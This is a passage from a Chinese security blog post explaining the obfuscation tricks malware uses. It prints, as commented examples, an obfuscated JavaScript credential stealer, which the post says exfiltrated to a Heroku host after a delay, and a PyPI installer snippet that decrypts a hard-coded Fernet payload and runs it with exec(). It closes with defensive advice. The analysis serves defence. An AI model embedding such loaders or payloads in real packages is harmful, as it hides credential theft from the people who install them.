\\t\\t\\t\\t_0x1248e3['\\\\x70\\\\x75\\\\x73\\\\x68'](_0x1248e3['\\\\x73\\\\x68\\\\x69\\\\x66\\\\x74']()); // 数组旋转/移位操作\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\t\\t}\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\t};\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\t_0x1262eb(++_0x53b88c); // 执行数组移位\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t}(_0x1262,0xfa)); // 0xfa = 250, 移位250次\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\tvar _0x27d8=function(_0x1248e3,_0x53b88c){ // 3. 间接函数调用：定义一个函数用于从数组中获取元素\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\t_0x1248e3=_0x1248e3-0xf7; // 0xf7 = 247, 对索引进行计算\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\tvar _0x1262eb=_0x1262[_0x1248e3];\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\treturn _0x1262eb;\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t};\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\tvar _0x1ee609=_0x27d8; // 变量别名，增加追踪难度\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\tPromise['\\\\x72\\\\x65\\\\x73\\\\x6f\\\\x6c\\\\x76\\\\x65'](()=\u003e{}) // 4. 属性访问混淆：Promise.resolve 通过字符串拼接访问\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\t['\\\\x74\\\\x68\\\\x65\\\\x6e'](()=\u003e{}) // Promise.then\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// \\t\\t[_0x1ee609(0xf7)](()=\u003e{}); // 实际调用 _0x27d8(247), 返回 _0x1262[0] 即 'then'\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"// };\"}],\"\\n\"]}]]}]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"解读：\"}],\" 这段 JavaScript 代码是一个高度混淆的凭证窃取器。\"]}],[\"$\",\"ol\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"字符串数组混淆与移位\"}],\"：字符串 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"'then'\"}],\" 被存储在 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"_0x1262\"}],\" 数组中。IIFE（立即执行函数表达式）对这个数组执行了多次移位操作（将第一个元素移到末尾），使得在静态分析时很难直接看出 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"_0x1262[0]\"}],\" 的原始值。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"间接函数调用与索引计算\"}],\"：函数 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"_0x27d8\"}],\" (别名为 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"_0x1ee609\"}],\") 用于从移位后的数组中获取元素。注意 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"_0x1248e3=_0x1248e3-0xf7;\"}],\" 这一步，它对传入的参数（例子中是 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"0xf7\"}],\"）进行计算得到实际的数组索引。 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"_0x1ee609(0xf7)\"}],\" 会计算 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"0xf7 - 0xf7 = 0\"}],\"，所以最终访问的是移位后数组的第一个元素。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"属性访问混淆\"}],\"：\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"Promise\"}],\" 对象的方法名（如 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"resolve\"}],\", \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"then\"}],\"）也是用编码后的字符串（如 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\\\\x72...\"}],\" for 'resolve', \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"\\\\x74...\"}],\" for 'then'）或通过上面那个间接函数 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"_0x1ee609(0xf7)\"}],\" 来访问的。 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"Promise['\\\\x72\\\\x65\\\\x73\\\\x6f\\\\x6c\\\\x76\\\\x65']\"}],\" 就是 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"Promise.resolve\"}],\"，\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"['\\\\x74\\\\x68\\\\x65\\\\x6e']\"}],\" 就是 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\".then\"}],\"。最后的 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"[_0x1ee609(0xf7)]\"}],\" 也是 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\".then\"}],\"。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"整体行为推测\"}],\"：该代码创建了一个空 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"Promise\"}],\" 并连续调用 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\".then\"}],\"。这种结构本身可能无害，但通常在恶意软件中，这些空的 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"()=\u003e{}\"}],\" 回调函数会被替换为实际的恶意操作，或者这种链式调用被用作延时、环境检测或更复杂控制流的一部分。原文解释它实现了30分钟延迟后将窃取到的凭证发送到 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"qooapp.herokuapp.com\"}],\"。这种延迟和复杂的混淆手段都是为了逃避安全监控。\"]}]]}],[\"$\",\"h3\",null,{\"className\":\"content-header\",\"id\":\"pypi-真实案例分析\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#pypi-真实案例分析\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"PyPI 真实案例分析\"]}],[\"$\",\"$L19\",null,{\"className\":\"language-python\",\"children\":[\"$\",\"code\",null,{\"className\":\"code-highlight language-python\",\"children\":[[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# from fernet import Fernet # Fernet 是一个对称加密库\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# # 1. Base64编码的加密密钥 和 加密的恶意代码\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# key = b'J8YKnvPEPLZNRm_nw8eL-CmUYkSwyXgjw7lEhHGRbjs='\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# encrypted_payload = b'gAAAAABmA1lfVy8Id9IYFHpxUElytS0hzBGFFBVfhPADNntNqVFk5lA4ihnrMrFXJUYrGuafAg8cXObYgzDxfgaQFsDsaDYgM5Whlh1x27fJAPE56R5LSQ-0RLrhjzVK-FW5OBXe3CaShMycB-4jI5SgaRmAnStca1mfniQm5PQ-YXATFnXQlsXtbNezHSLmIDY1OZ142ULls-37cF2OcT2PvKjN4USQA84-SxRToClOK4yGxGlSpjo='\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# # 2. 运行时解密和执行\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# fernet_obj = Fernet(key)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# decrypted_payload = fernet_obj.decrypt(encrypted_payload)\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# exec(decrypted_payload) # 3. 动态执行解密后的代码\"}],\"\\n\"]}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":\"\\n\"}],[\"$\",\"span\",null,{\"className\":\"code-line\",\"children\":[[\"$\",\"span\",null,{\"className\":\"token comment\",\"children\":\"# # install.run(self) # 这行代码表明它可能混在 setup.py 或类似安装脚本中\"}],\"\\n\"]}]]}]}],[\"$\",\"p\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"解读：\"}],\" 这段 Python 代码展示了使用加密来隐藏恶意负载的典型模式。\"]}],[\"$\",\"ol\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"加密负载\"}],\"：攻击者首先编写了恶意的 Python 代码，然后使用 Fernet 对称加密算法（或其他加密算法）将其加密。加密后的密文（\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"encrypted_payload\"}],\"）和加密所用的密钥（\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"key\"}],\"）被硬编码到发布的包中。注意，密钥和密文都以 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"b''\"}],\" 开头，表示它们是字节串，这对于加密操作是必要的。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"运行时解密\"}],\"：当这段代码执行时，它首先用硬编码的密钥实例化一个 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"Fernet\"}],\" 对象。然后，调用该对象的 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"decrypt\"}],\" 方法，传入加密的负载，得到解密后的原始恶意 Python 代码（字节串形式）。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"动态执行\"}],\"：最后，使用 \",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"exec()\"}],\" 函数执行解密后的恶意代码。\",[\"$\",\"code\",null,{\"className\":\"custom-code\",\"children\":\"exec()\"}],\" 可以执行字符串形式的 Python 代码。\"]}]]}],[\"$\",\"p\",null,{\"children\":\"这种方法的隐蔽性在于，静态分析工具扫描源代码时，只能看到加密的字节串和密钥，无法直接看到原始的恶意指令。只有在代码实际运行时，恶意代码才会被解密并执行。这使得基于签名的检测和简单的静态分析难以奏效。\"}],[\"$\",\"h2\",null,{\"className\":\"content-header\",\"id\":\"如何应对与防范\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#如何应对与防范\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"如何应对与防范？\"]}],[\"$\",\"p\",null,{\"children\":\"理解了这些混淆技术后，开发者和安全团队可以采取以下措施来加强防御：\"}],[\"$\",\"ol\",null,{\"children\":[[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"增强代码审查意识\"}],\"：对于引入的第三方库，尤其是来自不知名来源或行为可疑的包，进行更严格的代码审查。注意寻找上述混淆技术的迹象。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"利用去混淆工具\"}],\"：社区和商业公司提供了一些针对特定语言（如 JavaScript）的去混淆工具或在线服务，可以帮助还原部分混淆代码。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"动态分析与沙箱检测\"}],\"：在隔离的环境（沙箱）中运行可疑代码，监控其网络活动、文件系统更改和API调用，有助于发现其真实行为，即使代码被混淆。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"行为监控与启发式分析\"}],\"：安全工具不应仅依赖静态签名，还应结合行为分析和启发式规则来检测可疑模式，例如动态代码执行、非预期的网络连接等。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"供应链安全工具\"}],\"：使用专门的软件供应链安全工具，它们通常集成了依赖分析、漏洞扫描以及对已知恶意包和混淆模式的检测。\"]}],[\"$\",\"li\",null,{\"children\":[[\"$\",\"strong\",null,{\"children\":\"限制不必要的权限\"}],\"：遵循最小权限原则，确保应用程序仅拥有其执行核心功能所必需的权限，减少潜在恶意代码的影响范围。\"]}]]}],[\"$\",\"h2\",null,{\"className\":\"content-header\",\"id\":\"结论\",\"children\":[[\"$\",\"a\",null,{\"href\":\"#结论\",\"aria-hidden\":\"true\",\"tabIndex\":\"-1\",\"children\":[\"$\",\"span\",null,{\"className\":\"content-header-link\",\"children\":[\"$\",\"svg\",null,{\"className\":\"h-5 linkicon w-5\",\"fill\":\"currentColor\",\"viewBox\":\"0 0 20 20\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"children\":[[\"$\",\"path\",null,{\"d\":\"M12.232 4.232a2.5 2.5 0 0 1 3.536 3.536l-1.225 1.224a.75.75 0 0 0 1.061 1.06l1.224-1.224a4 4 0 0 0-5.656-5.656l-3 3a4 4 0 0 0 .225 5.865.75.75 0 0 0 .977-1.138 2.5 2.5 0 0 1-.142-3.667l3-3Z\"}],[\"$\",\"path\",null,{\"d\":\"M11.603 7.963a.75.75 0 0 0-.977 1.138 2.5 2.5 0 0 1 .142 3.667l-3 3a2.5 2.5 0 0 1-3.536-3.536l1.225-1.224a.75.75 0 0 0-1.061-1.06l-1.224 1.224a4 4 0 1 0 5.656 5.656l3-3a4 4 0 0 0-.225-5.865Z\"}]]}]}]}],\"结论\"]}],[\"$\",\"p\",null,{\"children\":\"代码混淆是恶意软件作者军火库中一个强大且常用的工具。通过将代码变得难以阅读和分析，他们试图在数字世界中隐藏其踪迹。然而，通过深入理解这些混淆技术的原理，并结合先进的检测工具和警惕的人工审查，我们可以更好地揭开这些“隐形”威胁的面纱，保护我们的软件和系统免受侵害。持续学习和适应攻击者不断演变的技术是打赢这场攻防战的关键。\"}]]}]}],[\"$\",\"div\",null,{\"className\":\"pb-6 pt-6 text-center text-gray-700 dark:text-gray-300\",\"id\":\"comment\",\"children\":[\"$\",\"$L1a\",null,{\"slug\":\"security/demystifying-obfuscation-techniques-in-malware\"}]}],[\"$\",\"footer\",null,{\"children\":[\"$\",\"div\",null,{\"className\":\"flex flex-col text-sm font-medium sm:flex-row sm:justify-between sm:text-base\",\"children\":[[\"$\",\"div\",null,{\"className\":\"pt-4 xl:pt-8\",\"children\":[\"$\",\"$Le\",null,{\"href\":\"/blog/security/zip-bombs-server-protection\",\"className\":\"text-primary-500 hover:text-primary-600 dark:hover:text-primary-400\",\"aria-label\":\"Previous post: 使用Zip炸弹保护您的Web服务器免受恶意爬虫攻击\",\"children\":[\"← \",\"使用Zip炸弹保护您的Web服务器免受恶意爬虫攻击\"]}]}],[\"$\",\"div\",null,{\"className\":\"pt-4 xl:pt-8\",\"children\":[\"$\",\"$Le\",null,{\"href\":\"/blog/tools/git-enhanced-configuration\",\"className\":\"text-primary-500 hover:text-primary-600 dark:hover:text-primary-400\",\"aria-label\":\"Next post: 核心开发者的Git配置秘籍\",\"children\":[\"核心开发者的Git配置秘籍\",\" →\"]}]}]]}]}]]}]]}]}]]}]]\n"])</script><script>self.__next_f.push([1,"15:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"揭秘恶意软件中的代码混淆把戏：深入原理与实例\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。\"}],[\"$\",\"meta\",\"4\",{\"name\":\"robots\",\"content\":\"index, follow\"}],[\"$\",\"meta\",\"5\",{\"name\":\"googlebot\",\"content\":\"index, follow, max-video-preview:-1, max-image-preview:large, max-snippet:-1\"}],[\"$\",\"link\",\"6\",{\"rel\":\"canonical\",\"href\":\"https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware\"}],[\"$\",\"link\",\"7\",{\"rel\":\"alternate\",\"type\":\"application/rss+xml\",\"href\":\"https://blog.mainjay.cloudns.ch/feed.xml\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:title\",\"content\":\"揭秘恶意软件中的代码混淆把戏：深入原理与实例\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:description\",\"content\":\"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。\"}],[\"$\",\"meta\",\"10\",{\"property\":\"og:url\",\"content\":\"https://blog.mainjay.cloudns.ch/blog/security/demystifying-obfuscation-techniques-in-malware\"}],[\"$\",\"meta\",\"11\",{\"property\":\"og:site_name\",\"content\":\"MainJayLai Blog\"}],[\"$\",\"meta\",\"12\",{\"property\":\"og:locale\",\"content\":\"en_US\"}],[\"$\",\"meta\",\"13\",{\"property\":\"og:image\",\"content\":\"https://pngimg.com/uploads/github/github_PNG80.png\"}],[\"$\",\"meta\",\"14\",{\"property\":\"og:type\",\"content\":\"article\"}],[\"$\",\"meta\",\"15\",{\"property\":\"article:published_time\",\"content\":\"2025-05-09T00:00:00.000Z\"}],[\"$\",\"meta\",\"16\",{\"property\":\"article:modified_time\",\"content\":\"2025-05-09T00:00:00.000Z\"}],[\"$\",\"meta\",\"17\",{\"property\":\"article:author\",\"content\":\"mainJayLai\"}],[\"$\",\"meta\",\"18\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"19\",{\"name\":\"twitter:title\",\"content\":\"揭秘恶意软件中的代码混淆把戏：深入原理与实例\"}],[\"$\",\"meta\",\"20\",{\"name\":\"twitter:description\",\"content\":\"恶意软件开发者常利用代码混淆技术来规避检测、隐藏真实意图。本文将深入剖析常见的混淆手段，如字符串编码、动态代码执行、控制流平坦化等，并通过实例揭示其工作原理，帮助开发者和安全研究员更好地识别和防范这些威胁。\"}],[\"$\",\"meta\",\"21\",{\"name\":\"twitter:image\",\"content\":\"https://pngimg.com/uploads/github/github_PNG80.png\"}],[\"$\",\"meta\",\"22\",{\"name\":\"next-size-adjust\"}]]\n"])</script><script>self.__next_f.push([1,"6:null\n"])</script></body></html>